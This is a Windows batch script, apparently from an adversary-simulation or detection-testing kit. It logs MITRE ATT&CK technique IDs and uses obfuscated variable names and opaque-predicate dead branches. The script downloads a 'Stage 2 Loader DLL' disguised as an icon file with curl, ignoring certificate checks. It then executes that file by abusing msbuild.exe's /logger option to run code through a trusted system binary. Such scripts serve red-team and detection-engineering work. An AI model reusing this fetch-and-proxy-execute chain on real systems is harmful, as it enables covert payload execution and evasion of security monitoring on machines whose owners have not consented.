@echo off
setlocal enabledelayedexpansion

REM --- Obfuscated SET variable preamble ---
SET akjdh=%APPDATA%\10349\1d748dfb
SET mnbvf=2ab33bb8.txt
SET qwzxc=https://10.0.0.49/stage/2/icon.png?10349-7
SET plkmj=ITZEL-S2BO
SET vbnmc=10349
SET ghzxp=7
SET hgyft=%APPDATA%\7\macula-simulations.log
SET rtyui=%APPDATA%\7

REM Cache timestamp once at script start
SET tsvar=!DATE!/!TIME!

REM Initialize log file path
SET logfile=!hgyft!

REM ---------------------------------------------------------------------------
REM Opaque predicate #1: Always true (date string is non-empty)
REM ---------------------------------------------------------------------------
if not "!DATE!"=="" (
    REM Opaque predicate #2: Always true (RANDOM <= 32767, so RANDOM GTR 32767 is false)
    if !RANDOM! GTR 32767 (
        echo Dead branch >nul
    ) else (
        REM Real logic begins here, wrapped in a state machine
        SET state=0
        :loop
        if !state!==0 goto :step0
        if !state!==1 goto :step1
        if !state!==2 goto :step2
        if !state!==3 goto :step3
        if !state!==4 goto :step4
        if !state!==5 goto :step5
        if !state!==6 goto :step6
        goto :end
    )
) else (
    echo Unreachable >nul
)

:step0
REM Heartbeat fetch (download Stage 2 Loader DLL)
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!akjdh!\!mnbvf!" "!qwzxc!"
if !ERRORLEVEL! NEQ 0 (
    echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: heartbeat_fail=!ERRORLEVEL!>> "!logfile!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: heartbeat_success=0>> "!logfile!" 2>nul
)
SET state=1
goto :loop

:step1
REM Change working directory
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: chdir_start>> "!logfile!" 2>nul
cd /d "!akjdh!" >nul 2>&1
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: chdir_result=!ERRORLEVEL!>> "!logfile!" 2>nul
SET state=2
goto :loop

:step2
REM Create minimal .proj file for msbuild
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: create_proj_start>> "!logfile!" 2>nul
echo ^<Project/^> > "!akjdh!\build.proj"
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: create_proj_result=!ERRORLEVEL!>> "!logfile!" 2>nul
SET state=3
goto :loop

:step3
REM LOLBIN invocation via msbuild.exe /logger:
echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: msbuild_start>> "!logfile!" 2>nul

REM Capture ERRORLEVEL immediately after msbuild, before any debug echo
if exist "%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe" (
    "%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe" "!akjdh!\build.proj" /logger:LoggerEntry,"!akjdh!\!mnbvf!";MyParameters,Foo >NUL 2>&1
    SET lolbin_exit=!ERRORLEVEL!
) else if exist "%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe" (
    "%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe" "!akjdh!\build.proj" /logger:LoggerEntry,"!akjdh!\!mnbvf!";MyParameters,Foo >NUL 2>&1
    SET lolbin_exit=!ERRORLEVEL!
) else (
    SET lolbin_exit=999
)

echo [!tsvar!][DEBUG][!plkmj!][!vbnmc!]: msbuild_exit=!lolbin_exit!>> "!logfile!" 2>nul
SET state=4
goto :loop

:step4
REM TTP logging: T1218 (System Binary Proxy Execution)
if !lolbin_exit! EQU 0 (
    echo [!tsvar!][TTP][!plkmj!][!vbnmc!]: T1218^|System Binary Proxy Execution=[OK]:[] >> "!logfile!" 2>nul
) else (
    echo [!tsvar!][TTP][!plkmj!][!vbnmc!]: T1218^|System Binary Proxy Execution=[FAIL]:msbuild_exit_nonzero >> "!logfile!" 2>nul
)
SET state=5
goto :loop

:step5
REM TTP logging: T1027 (Obfuscated Files or Information) – always OK
echo [!tsvar!][TTP][!plkmj!][!vbnmc!]: T1027^|Obfuscated Files or Information=[OK]:[] >> "!logfile!" 2>nul
SET state=6
goto :loop

:step6
REM Opaque predicate – always false, dead code
if !RANDOM! GTR 32767 (
    echo Simulated dead code >nul
)
SET state=-1
goto :loop

:end
endlocal